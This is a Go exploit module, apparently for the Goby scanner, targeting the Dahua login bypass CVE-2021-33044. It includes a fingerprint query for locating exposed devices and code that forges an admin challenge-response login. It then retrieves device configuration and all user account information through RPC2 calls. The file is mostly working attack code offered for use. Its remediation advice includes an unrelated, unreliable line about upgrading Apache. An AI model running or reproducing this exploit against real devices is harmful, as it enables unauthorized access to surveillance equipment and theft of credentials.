package exploits

import (
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)



func init() {
	expJson := `{
    "Name": "DaHua Login Bypass (CVE-2021-33044)",
    "Description": "<p>SD, TPC, VTO, and IPC are video products under the umbrella of Dahua.</p><p>The identity authentication bypass vulnerability found in some Dahua products during the login process. Attackers can bypass device identity authentication by constructing malicious data packets.</p>",
    "Impact": "<p>DaHua Login Bypass (CVE-2021-33044)</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.dahuasecurity.com/support/cybersecurity/details/957\">https://www.dahuasecurity.com/support/cybersecurity/details/957</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
    "Product": "Dahua",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "大华视频部分产品存在登录绕过漏洞（CVE-2021-33044）",
            "Product": "大华",
            "Description": "<p>SD, TPC, VTO, IPC是大华旗下的视频系列产品。</p><p>大华视频部分产品存在登录身份认证绕过漏洞，攻击者可以通过构造恶意数据包来绕过设备身份验证,获取系统敏感配置和信息。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://www.dahuasecurity.com/support/cybersecurity/details/957\">https://www.dahuasecurity.com/support/cybersecurity/details/957</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、升级Apache系统版本。</p>",
            "Impact": "<p>大华视频部分产品存在登录身份认证绕过漏洞，攻击者可以通过构造恶意数据包来绕过设备身份验证,获取系统敏感配置和信息。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "DaHua Login Bypass (CVE-2021-33044)",
            "Product": "Dahua",
            "Description": "<p>SD, TPC, VTO, and IPC are video products under the umbrella of Dahua.</p><p>The identity authentication bypass vulnerability found in some Dahua products during the login process. Attackers can bypass device identity authentication by constructing malicious data packets.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.dahuasecurity.com/support/cybersecurity/details/957\">https://www.dahuasecurity.com/support/cybersecurity/details/957</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
            "Impact": "<p>DaHua Login Bypass (CVE-2021-33044)</p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "((body=\"id=\\\"search_card_label\\\" for=\\\"search_PlateEnable\\\">车牌号码</label>\" && body!=\"Server: couchdb\" )|| (protocol=\"rtsp\" && banner=\"Server: Dahua Rtsp\") || header=\"Server: DaHua DRS\" || banner=\"Server: DaHua DRS\" || header=\"Server: Dahua Rtsp Server\" || banner=\"Server: Dahua Rtsp Server\" || (header=\"ZheJiang Dahua Technology\" && header!=\"Content-Length: 59552\") || banner=\"ZheJiang Dahua Technology\" || banner=\"Basic realm=\\\"DahuaRtsp\" || (body=\"var g_isdeviceinited = true\" && body=\"widget/js/jquery.ui.widget.js\" && body=\"title::com_menu.title_setup\" && title!=\"WATASHI SERVICE\") || (body=\"css/playbackindex.css\" && body=\"class=\\\"J_content J_min_width\\\"\") || (body=\"J_sub_con J_loginbox\" && body=\"overflow:hidden;background-color\" && body=\"js/urlParser.js\") || (body=\"id=\\\"lab_loading\\\" class=\\\"J_load_p\" && body=\"src=\\\"/cap.js\\\"\" && body=\"'nav_margin').style.visibility = 'visible\" && title==\"WEB SERVICE\" && body!=\"/css/oem.css\" && body!=\"loginfoot\\\">WEB视频监控系统\" && body!=\"webApp.ability.getWebCap('showGb28181Client'\" && body!=\"class=\\\"ui-tip-container\\\" id=\\\"remark_modU\\\"\" && body!=\"class=\\\"login_inputbox ui-input fn-width163\\\"\") || body=\"tl(\\\"huazhonghua\\\")\" || (body=\"dhvideowhmode\" && body=\"platformHtm\" && body!=\"cpplus_bottom\" && body!=\"www.amcrest.com\" && body!=\"Amcrest\" && body!=\"interbras_font\" && body!=\"interbras_cloud\" && body!=\"interbrasCloud\") || (body=\"onkeypress=\\\"forbidBackSpace(event)\" && body=\"InsertNetRecordFileInfo\" && body=\"<div class=\\\"loginfoot\\\">WEB视频监控系统 - 2014</div>\") || (cert=\"Organization: DahuaTech\" && title=\"WEB SERVICE\") || (body=\"t_changepwdhint\" && body=\"ipsanuserManage_diaModUser_username_title\") || (body=\"var g_NaclWin\" && body=\"var g_isDeviceInited\" && body=\"if(g_ocx) g_ocx.SetTranslateString(jsonLang);\" && body!=\"class=\\\"oem-login-background\")) && cert!=\"Honeywell GPC Video\" && body!=\"<span>浩云安防</span></div>\"",
    "GobyQuery": "((body=\"id=\\\"search_card_label\\\" for=\\\"search_PlateEnable\\\">车牌号码</label>\" && body!=\"Server: couchdb\" )|| (protocol=\"rtsp\" && banner=\"Server: Dahua Rtsp\") || header=\"Server: DaHua DRS\" || banner=\"Server: DaHua DRS\" || header=\"Server: Dahua Rtsp Server\" || banner=\"Server: Dahua Rtsp Server\" || (header=\"ZheJiang Dahua Technology\" && header!=\"Content-Length: 59552\") || banner=\"ZheJiang Dahua Technology\" || banner=\"Basic realm=\\\"DahuaRtsp\" || (body=\"var g_isdeviceinited = true\" && body=\"widget/js/jquery.ui.widget.js\" && body=\"title::com_menu.title_setup\" && title!=\"WATASHI SERVICE\") || (body=\"css/playbackindex.css\" && body=\"class=\\\"J_content J_min_width\\\"\") || (body=\"J_sub_con J_loginbox\" && body=\"overflow:hidden;background-color\" && body=\"js/urlParser.js\") || (body=\"id=\\\"lab_loading\\\" class=\\\"J_load_p\" && body=\"src=\\\"/cap.js\\\"\" && body=\"'nav_margin').style.visibility = 'visible\" && title==\"WEB SERVICE\" && body!=\"/css/oem.css\" && body!=\"loginfoot\\\">WEB视频监控系统\" && body!=\"webApp.ability.getWebCap('showGb28181Client'\" && body!=\"class=\\\"ui-tip-container\\\" id=\\\"remark_modU\\\"\" && body!=\"class=\\\"login_inputbox ui-input fn-width163\\\"\") || body=\"tl(\\\"huazhonghua\\\")\" || (body=\"dhvideowhmode\" && body=\"platformHtm\" && body!=\"cpplus_bottom\" && body!=\"www.amcrest.com\" && body!=\"Amcrest\" && body!=\"interbras_font\" && body!=\"interbras_cloud\" && body!=\"interbrasCloud\") || (body=\"onkeypress=\\\"forbidBackSpace(event)\" && body=\"InsertNetRecordFileInfo\" && body=\"<div class=\\\"loginfoot\\\">WEB视频监控系统 - 2014</div>\") || (cert=\"Organization: DahuaTech\" && title=\"WEB SERVICE\") || (body=\"t_changepwdhint\" && body=\"ipsanuserManage_diaModUser_username_title\") || (body=\"var g_NaclWin\" && body=\"var g_isDeviceInited\" && body=\"if(g_ocx) g_ocx.SetTranslateString(jsonLang);\" && body!=\"class=\\\"oem-login-background\")) && cert!=\"Honeywell GPC Video\" && body!=\"<span>浩云安防</span></div>\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.dahuasecurity.com/",
    "DisclosureDate": "2021-10-06",
    "References": [
        "https://www.dahuasecurity.com/support/cybersecurity/details/957"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.0",
    "CVEIDs": [
        "CVE-2021-33044"
    ],
    "CNVD": [
        "CNVD-2021-70816"
    ],
    "CNNVD": [
        "CNNVD-202109-1080"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "method",
            "type": "createSelect",
            "value": "configManager.getMemberNames,configManager.getConfig,userManager.getUserInfoAll",
            "show": ""
        },
        {
            "name": "params",
            "type": "createSelect",
            "value": ",device,RemoteDevice",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": [
            "Dahua"
        ]
    },
    "PocId": "10231"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := `/RPC2_Login`
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg1.Data = `{"method": "global.login", "params": {"userName": "admin", "password": "", "clientType": "Web3.0", "loginType": "Direct"}, "id": 0, "session": 0}`
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp1.StatusCode == 200 {
				realmFind := regexp.MustCompile("\"realm\":\"(.*?)\"},").FindStringSubmatch(resp1.RawBody)
				randomFind := regexp.MustCompile("\"random\":\"(.*?)\",\"realm\"").FindStringSubmatch(resp1.RawBody)
				sessionFind := regexp.MustCompile("\"session\":\"(.*?)\"}").FindStringSubmatch(resp1.RawBody)
				md51 := md5.Sum([]byte(fmt.Sprintf("admin:%s:admin", realmFind[1])))
				md51Upper := strings.ToUpper(fmt.Sprintf("%x", md51))
				md52 := md5.Sum([]byte(fmt.Sprintf("admin:%s:%s", randomFind[1], md51Upper)))
				md52Upper := strings.ToUpper(fmt.Sprintf("%x", md52))
				uri2 := `/RPC2_Login`
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
				cfg2.Data = fmt.Sprintf(`{"method": "global.login", "params": {"userName": "admin", "ipAddr": "127.0.0.1", "loginType": "Direct", "clientType": "NetKeyboard", "authorityType": "Default", "passwordType": "Default", "password": "%s"}, "id": 1, "session": "%s"}`, md52Upper, sessionFind[1])
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil && resp2.StatusCode == 200 {
					return strings.Contains(resp2.RawBody, `"result":true,"session":"`+sessionFind[1])
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			method := ss.Params["method"].(string)
			params := ss.Params["params"].(string)
			uri1 := `/RPC2_Login`
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg1.Data = `{"method": "global.login", "params": {"userName": "admin", "password": "", "clientType": "Web3.0", "loginType": "Direct"}, "id": 0, "session": 0}`
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp1.StatusCode == 200 {
				realmFind := regexp.MustCompile("\"realm\":\"(.*?)\"},").FindStringSubmatch(resp1.RawBody)
				randomFind := regexp.MustCompile("\"random\":\"(.*?)\",\"realm\"").FindStringSubmatch(resp1.RawBody)
				sessionFind := regexp.MustCompile("\"session\":\"(.*?)\"}").FindStringSubmatch(resp1.RawBody)
				md51 := md5.Sum([]byte(fmt.Sprintf("admin:%s:admin", realmFind[1])))
				md51Upper := strings.ToUpper(fmt.Sprintf("%x", md51))
				md52 := md5.Sum([]byte(fmt.Sprintf("admin:%s:%s", randomFind[1], md51Upper)))
				md52Upper := strings.ToUpper(fmt.Sprintf("%x", md52))
				uri2 := `/RPC2_Login`
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
				cfg2.Data = fmt.Sprintf(`{"method": "global.login", "params": {"userName": "admin", "ipAddr": "127.0.0.1", "loginType": "Direct", "clientType": "NetKeyboard", "authorityType": "Default", "passwordType": "Default", "password": "%s"}, "id": 1, "session": "%s"}`, md52Upper, sessionFind[1])
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					if resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, `"result":true,"session":"`+sessionFind[1]) {
						uri3 := `/RPC2`
						cfg3 := httpclient.NewPostRequestConfig(uri3)
						cfg3.VerifyTls = false
						cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
						cfg3.Data = fmt.Sprintf(`{"method": "%s", "params": {"name": "%s"}, "id": 7, "session": "%s"}`, method, params, sessionFind[1])
						if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil && resp3.StatusCode == 200 {
							expResult.Output = "session is: " + sessionFind[1] + "\n\n" + resp3.RawBody
							expResult.Success = true
						}
					}
				}
			}
			return expResult
		},
	))
}
